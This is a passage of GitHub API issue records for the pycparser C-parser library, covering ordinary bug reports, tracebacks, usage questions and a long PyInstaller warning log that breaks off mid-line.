"https://avatars2.githubusercontent.com/u/8604178?v=4", "gravatar_id": "", "url": "https://api.github.com/users/rreilink", "html_url": "https://github.com/rreilink", "followers_url": "https://api.github.com/users/rreilink/followers", "following_url": "https://api.github.com/users/rreilink/following{/other_user}", "gists_url": "https://api.github.com/users/rreilink/gists{/gist_id}", "starred_url": "https://api.github.com/users/rreilink/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/rreilink/subscriptions", "organizations_url": "https://api.github.com/users/rreilink/orgs", "repos_url": "https://api.github.com/users/rreilink/repos", "events_url": "https://api.github.com/users/rreilink/events{/privacy}", "received_events_url": "https://api.github.com/users/rreilink/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2018-12-26T07:58:12Z", "updated_at": "2018-12-29T03:17:23Z", "closed_at": "2018-12-28T02:03:48Z", "author_association": "NONE", "active_lock_reason": null, "body": "pycparser.ply.cpp.Preprocessor.evalexpr does an attempt to convern a C-expression to a Python expression by converting ! to not (as in: `!(a==b)`) but inatvertendly it also convert `a!=b` to `a not =b` which is obviously not valid syntax.\r\n\r\nFurthermore, undefined identifiers are replaced by `0L` which is not valid Python3 syntax, this should be just `0`.\r\n\r\nAdditionally, the preprocessing of the evaluation and the actual evaluation should be split into separate methods, such that when deriving from this class, the evaluation could be overridden while the preprocessing (macro expansion etc) stays as-is (in case e.g. due to security concerns one might not want to use eval)\r\n\r\nI will prepare a PR.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/298", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/298/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/298/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/298/events", "html_url": "https://github.com/eliben/pycparser/issues/298", "id": 390215981, "node_id": "MDU6SXNzdWUzOTAyMTU5ODE=", "number": 298, "title": "How to analysis C source files in a big C project ??Using Clang to do preprocess.", "user": {"login": "zmcrazy", "id": 31725114, "node_id": "MDQ6VXNlcjMxNzI1MTE0", "avatar_url": "https://avatars2.githubusercontent.com/u/31725114?v=4", "gravatar_id": "", "url": "https://api.github.com/users/zmcrazy", "html_url": "https://github.com/zmcrazy", "followers_url": "https://api.github.com/users/zmcrazy/followers", "following_url": "https://api.github.com/users/zmcrazy/following{/other_user}", "gists_url": "https://api.github.com/users/zmcrazy/gists{/gist_id}", "starred_url": "https://api.github.com/users/zmcrazy/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/zmcrazy/subscriptions", "organizations_url": "https://api.github.com/users/zmcrazy/orgs", "repos_url": "https://api.github.com/users/zmcrazy/repos", "events_url": "https://api.github.com/users/zmcrazy/events{/privacy}", "received_events_url": "https://api.github.com/users/zmcrazy/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2018-12-12T13:01:47Z", "updated_at": "2018-12-14T13:01:18Z", "closed_at": "2018-12-13T03:46:24Z", "author_association": "NONE", "active_lock_reason": null, "body": "![image](https://user-images.githubusercontent.com/31725114/49871218-94acee00-fe50-11e8-893a-58f472e1c153.png)\r\nI mean some cpp args are included in makefile or else.\r\nNeed I extract them from makefile and write them in cpp_args of parse_file function in python scripts?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/296", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/296/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/296/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/296/events", "html_url": "https://github.com/eliben/pycparser/issues/296", "id": 388091050, "node_id": "MDU6SXNzdWUzODgwOTEwNTA=", "number": 296, "title": "TypeError: __init__() got an unexpected keyword argument 'encoding' while run both using_gcc_E_libc.py and using_cpp_libc.py", "user": {"login": "BraveY", "id": 22376205, "node_id": "MDQ6VXNlcjIyMzc2MjA1", "avatar_url": "https://avatars2.githubusercontent.com/u/22376205?v=4", "gravatar_id": "", "url": "https://api.github.com/users/BraveY", "html_url": "https://github.com/BraveY", "followers_url": "https://api.github.com/users/BraveY/followers", "following_url": "https://api.github.com/users/BraveY/following{/other_user}", "gists_url": "https://api.github.com/users/BraveY/gists{/gist_id}", "starred_url": "https://api.github.com/users/BraveY/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/BraveY/subscriptions", "organizations_url": "https://api.github.com/users/BraveY/orgs", "repos_url": "https://api.github.com/users/BraveY/repos", "events_url": "https://api.github.com/users/BraveY/events{/privacy}", "received_events_url": "https://api.github.com/users/BraveY/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2018-12-06T07:37:50Z", "updated_at": "2018-12-06T13:16:19Z", "closed_at": "2018-12-06T13:16:19Z", "author_association": "NONE", "active_lock_reason": null, "body": "i could run c-to-c.py succesfully, but when i run using_gcc_E_libc.py and using_cpp_libc.py i got same error:TypeError: __init__() got an unexpected keyword argument 'encoding'.\r\n1. when i run using_cpp_libc.py in root directory i got :\r\n```\r\nroot@hw103:/home/yky/pycparser/pycparser# python examples/using_cpp_libc.py \r\nTraceback (most recent call last):\r\n  File \"examples/using_cpp_libc.py\", line 29, in <module>\r\n    cpp_args=r'-Iutils/fake_libc_include')\r\n  File \"./pycparser/__init__.py\", line 89, in parse_file\r\n    text = preprocess_file(filename, cpp_path, cpp_args, encoding)\r\n  File \"./pycparser/__init__.py\", line 45, in preprocess_file\r\n    text = check_output(path_list, universal_newlines=True, encoding=encoding)\r\n  File \"/usr/lib/python2.7/subprocess.py\", line 567, in check_output\r\n    process = Popen(stdout=PIPE, *popenargs, **kwargs)\r\nTypeError: __init__() got an unexpected keyword argument 'encoding'\r\n```\r\n2.  when i run using_gcc_E_libc.py in root directory i got :\r\n```\r\nroot@hw103:/home/yky/pycparser/pycparser# python examples/using_gcc_E_libc.py \r\nTraceback (most recent call last):\r\n  File \"examples/using_gcc_E_libc.py\", line 29, in <module>\r\n    cpp_args=['-E', r'-Iutils/fake_libc_include'])\r\n  File \"./pycparser/__init__.py\", line 89, in parse_file\r\n    text = preprocess_file(filename, cpp_path, cpp_args, encoding)\r\n  File \"./pycparser/__init__.py\", line 45, in preprocess_file\r\n    text = check_output(path_list, universal_newlines=True, encoding=encoding)\r\n  File \"/usr/lib/python2.7/subprocess.py\", line 567, in check_output\r\n    process = Popen(stdout=PIPE, *popenargs, **kwargs)\r\nTypeError: __init__() got an unexpected keyword argument 'encoding'\r\n```\r\n3. information of cpp  and gcc in my computer\r\n```\r\nroot@hw103:/home/yky/pycparser/pycparser# which cpp\r\n/usr/bin/cpp\r\nroot@hw103:/home/yky/pycparser/pycparser# cpp --version\r\ncpp (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609\r\nCopyright (C) 2015 Free Software Foundation, Inc.\r\nThis is free software; see the source for copying conditions.  There is NO\r\nwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\r\n```\r\n\r\n````\r\nroot@hw103:/home/yky/pycparser/pycparser# which gcc \r\n/usr/bin/gcc\r\nroot@hw103:/home/yky/pycparser/pycparser# gcc --version\r\ngcc (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609\r\nCopyright (C) 2015 Free Software Foundation, Inc.\r\nThis is free software; see the source for copying conditions.  There is NO\r\nwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/293", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/293/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/293/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/293/events", "html_url": "https://github.com/eliben/pycparser/issues/293", "id": 386442871, "node_id": "MDU6SXNzdWUzODY0NDI4NzE=", "number": 293, "title": "parsing some unicode file failed", "user": {"login": "ilovexyz", "id": 18619226, "node_id": "MDQ6VXNlcjE4NjE5MjI2", "avatar_url": "https://avatars3.githubusercontent.com/u/18619226?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ilovexyz", "html_url": "https://github.com/ilovexyz", "followers_url": "https://api.github.com/users/ilovexyz/followers", "following_url": "https://api.github.com/users/ilovexyz/following{/other_user}", "gists_url": "https://api.github.com/users/ilovexyz/gists{/gist_id}", "starred_url": "https://api.github.com/users/ilovexyz/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ilovexyz/subscriptions", "organizations_url": "https://api.github.com/users/ilovexyz/orgs", "repos_url": "https://api.github.com/users/ilovexyz/repos", "events_url": "https://api.github.com/users/ilovexyz/events{/privacy}", "received_events_url": "https://api.github.com/users/ilovexyz/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-12-01T09:48:37Z", "updated_at": "2018-12-04T12:53:34Z", "closed_at": "2018-12-04T12:53:34Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "when parsing some unicode files with function parse_file, the following error occured\r\n`String contains invalid escape code`\r\n\r\nAfter debugging the code, i found `parse_file->preprocess_file->check_output` did not have the `encoding` parameter. if changing the code from file `pycparser\\__init__.py:42` to this\r\n` text = check_output(path_list, universal_newlines=True, encoding='utf-8')`\r\nthe error disappears\r\n\r\nHowerver, i think the correct way to fix this problem is to give users the option to pass `encoding` parameter, and other parameters as well. \r\nSo i suggest adding `**kwargs` to function parse_file and preprocess_file, i am not sure whether i am right or not @eliben ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/292", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/292/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/292/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/292/events", "html_url": "https://github.com/eliben/pycparser/issues/292", "id": 385873470, "node_id": "MDU6SXNzdWUzODU4NzM0NzA=", "number": 292, "title": "How do I reverse byte order of constants before printing? ", "user": {"login": "elgebalo", "id": 25068226, "node_id": "MDQ6VXNlcjI1MDY4MjI2", "avatar_url": "https://avatars0.githubusercontent.com/u/25068226?v=4", "gravatar_id": "", "url": "https://api.github.com/users/elgebalo", "html_url": "https://github.com/elgebalo", "followers_url": "https://api.github.com/users/elgebalo/followers", "following_url": "https://api.github.com/users/elgebalo/following{/other_user}", "gists_url": "https://api.github.com/users/elgebalo/gists{/gist_id}", "starred_url": "https://api.github.com/users/elgebalo/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/elgebalo/subscriptions", "organizations_url": "https://api.github.com/users/elgebalo/orgs", "repos_url": "https://api.github.com/users/elgebalo/repos", "events_url": "https://api.github.com/users/elgebalo/events{/privacy}", "received_events_url": "https://api.github.com/users/elgebalo/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2018-11-29T18:43:53Z", "updated_at": "2018-12-01T13:24:28Z", "closed_at": "2018-11-30T14:19:55Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello,\r\nI am trying to figure out how to reverse the byte order of constants in C code before printing them. I initially tried to use the Constant class but I need the names of the constants too and the constant class only provides the value and type. My goal is to parse C code and be able to reverse the byte order of all constants (e.g 0x85A308D3 -> 0xD308A385) and also have the names of those constants. Do you have any ideas that would point me in the right direction? This is what I have so far...Appreciate any insight!\r\n\r\n`from __future__ import print_function\r\nimport sys\r\nsys.path.extend(['.', '..'])\r\n\r\nfrom pycparser import c_parser, c_ast, parse_file\r\n\r\ndef show_tree(filename):\r\n    ast = parse_file(filename, use_cpp=True,cpp_args=['-E', r'-Iutils/fake_libc_include'])\r\n    ast_buffer_write=open(\"buffer.txt\",\"w\") # here will be your AST source\r\n    ast.show(ast_buffer_write,attrnames=True)\r\n    ast_buffer_write.close()\r\n    \r\nif __name__ == \"__main__\":\r\n    if len(sys.argv) > 1:\r\n        filename  = sys.argv[1]\r\n    else:\r\n        filename = 'xmrig-master/src/crypto/c_blake256.c'\r\n\r\n    show_tree(filename)`\r\n\r\n ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/291", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/291/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/291/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/291/events", "html_url": "https://github.com/eliben/pycparser/issues/291", "id": 381748130, "node_id": "MDU6SXNzdWUzODE3NDgxMzA=", "number": 291, "title": "ERROR: start symbol translation_unit_or_empty undefined", "user": {"login": "zdenop", "id": 574156, "node_id": "MDQ6VXNlcjU3NDE1Ng==", "avatar_url": "https://avatars3.githubusercontent.com/u/574156?v=4", "gravatar_id": "", "url": "https://api.github.com/users/zdenop", "html_url": "https://github.com/zdenop", "followers_url": "https://api.github.com/users/zdenop/followers", "following_url": "https://api.github.com/users/zdenop/following{/other_user}", "gists_url": "https://api.github.com/users/zdenop/gists{/gist_id}", "starred_url": "https://api.github.com/users/zdenop/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/zdenop/subscriptions", "organizations_url": "https://api.github.com/users/zdenop/orgs", "repos_url": "https://api.github.com/users/zdenop/repos", "events_url": "https://api.github.com/users/zdenop/events{/privacy}", "received_events_url": "https://api.github.com/users/zdenop/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2018-11-16T20:26:32Z", "updated_at": "2019-09-24T16:10:39Z", "closed_at": "2019-08-26T22:13:38Z", "author_association": "NONE", "active_lock_reason": null, "body": "When I run pyinstaller3.4 on windows 10 64bit (python3.6 64bit) I got this error (pycparser  2.19):\r\n```\r\nC:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:20: RuntimeWarning: parsing methods must have __doc__ for pycparser to work properly\r\n  class CParser(PLYParser):\r\nWARNING: There was a problem loading the table file: KeyError('p_direct_id_declarator_1',)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:513: No documentation string specified in function 'p_translation_unit_or_empty' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:522: No documentation string specified in function 'p_translation_unit_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:529: No documentation string specified in function 'p_translation_unit_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:541: No documentation string specified in function 'p_external_declaration_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:546: No documentation string specified in function 'p_external_declaration_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:551: No documentation string specified in function 'p_external_declaration_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:557: No documentation string specified in function 'p_external_declaration_4' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:562: No documentation string specified in function 'p_pp_directive' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:568: No documentation string specified in function 'p_pppragma_directive' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:580: No documentation string specified in function 'p_function_definition_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:597: No documentation string specified in function 'p_function_definition_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:608: No documentation string specified in function 'p_statement' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:661: No documentation string specified in function 'p_pragmacomp_or_statement' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:681: No documentation string specified in function 'p_decl_body' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:741: No documentation string specified in function 'p_declaration' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:750: No documentation string specified in function 'p_declaration_list' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:761: No documentation string specified in function 'p_declaration_specifiers_no_type_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:766: No documentation string specified in function 'p_declaration_specifiers_no_type_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:771: No documentation string specified in function 'p_declaration_specifiers_no_type_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:777: No documentation string specified in function 'p_declaration_specifiers_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:782: No documentation string specified in function 'p_declaration_specifiers_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:787: No documentation string specified in function 'p_declaration_specifiers_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:792: No documentation string specified in function 'p_declaration_specifiers_4' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:797: No documentation string specified in function 'p_declaration_specifiers_5' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:802: No documentation string specified in function 'p_declaration_specifiers_6' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:808: No documentation string specified in function 'p_storage_class_specifier' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:817: No documentation string specified in function 'p_function_specifier' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:822: No documentation string specified in function 'p_type_specifier_no_typeid' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:838: No documentation string specified in function 'p_type_specifier' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:846: No documentation string specified in function 'p_type_qualifier' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:853: No documentation string specified in function 'p_init_declarator_list' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:862: No documentation string specified in function 'p_init_declarator' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:868: No documentation string specified in function 'p_id_init_declarator_list' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:874: No documentation string specified in function 'p_id_init_declarator' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:882: No documentation string specified in function 'p_specifier_qualifier_list_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:887: No documentation string specified in function 'p_specifier_qualifier_list_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:892: No documentation string specified in function 'p_specifier_qualifier_list_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:897: No documentation string specified in function 'p_specifier_qualifier_list_4' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:906: No documentation string specified in function 'p_struct_or_union_specifier_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:917: No documentation string specified in function 'p_struct_or_union_specifier_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:935: No documentation string specified in function 'p_struct_or_union_specifier_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:954: No documentation string specified in function 'p_struct_or_union' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:962: No documentation string specified in function 'p_struct_declaration_list' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:971: No documentation string specified in function 'p_struct_declaration_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1009: No documentation string specified in function 'p_struct_declaration_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1014: No documentation string specified in function 'p_struct_declaration_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1019: No documentation string specified in function 'p_struct_declarator_list' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1028: No documentation string specified in function 'p_struct_declarator_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1033: No documentation string specified in function 'p_struct_declarator_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1042: No documentation string specified in function 'p_enum_specifier_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1048: No documentation string specified in function 'p_enum_specifier_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1053: No documentation string specified in function 'p_enum_specifier_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1059: No documentation string specified in function 'p_enumerator_list' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1072: No documentation string specified in function 'p_enumerator' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1088: No documentation string specified in function 'p_declarator' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1200: No documentation string specified in function 'p_pointer' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1230: No documentation string specified in function 'p_type_qualifier_list' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1236: No documentation string specified in function 'p_parameter_type_list' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1245: No documentation string specified in function 'p_parameter_list' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1265: No documentation string specified in function 'p_parameter_declaration_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1277: No documentation string specified in function 'p_parameter_declaration_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1308: No documentation string specified in function 'p_identifier_list' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1318: No documentation string specified in function 'p_initializer_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1323: No documentation string specified in function 'p_initializer_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1332: No documentation string specified in function 'p_initializer_list' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1344: No documentation string specified in function 'p_designation' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1352: No documentation string specified in function 'p_designator_list' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1358: No documentation string specified in function 'p_designator' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1364: No documentation string specified in function 'p_type_name' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1375: No documentation string specified in function 'p_abstract_declarator_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1383: No documentation string specified in function 'p_abstract_declarator_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1388: No documentation string specified in function 'p_abstract_declarator_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1398: No documentation string specified in function 'p_direct_abstract_declarator_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1402: No documentation string specified in function 'p_direct_abstract_declarator_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1413: No documentation string specified in function 'p_direct_abstract_declarator_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1422: No documentation string specified in function 'p_direct_abstract_declarator_4' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1433: No documentation string specified in function 'p_direct_abstract_declarator_5' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1442: No documentation string specified in function 'p_direct_abstract_declarator_6' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1452: No documentation string specified in function 'p_direct_abstract_declarator_7' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1463: No documentation string specified in function 'p_block_item' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1471: No documentation string specified in function 'p_block_item_list' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1478: No documentation string specified in function 'p_compound_statement_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1484: No documentation string specified in function 'p_labeled_statement_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1488: No documentation string specified in function 'p_labeled_statement_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1492: No documentation string specified in function 'p_labeled_statement_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1496: No documentation string specified in function 'p_selection_statement_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1500: No documentation string specified in function 'p_selection_statement_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1504: No documentation string specified in function 'p_selection_statement_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1509: No documentation string specified in function 'p_iteration_statement_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1513: No documentation string specified in function 'p_iteration_statement_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1517: No documentation string specified in function 'p_iteration_statement_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1521: No documentation string specified in function 'p_iteration_statement_4' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1526: No documentation string specified in function 'p_jump_statement_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1530: No documentation string specified in function 'p_jump_statement_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1534: No documentation string specified in function 'p_jump_statement_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1538: No documentation string specified in function 'p_jump_statement_4' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1544: No documentation string specified in function 'p_expression_statement' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1551: No documentation string specified in function 'p_expression' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1564: No documentation string specified in function 'p_typedef_name' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1568: No documentation string specified in function 'p_assignment_expression' (ignored)\r\nWARNING: C:\\Program 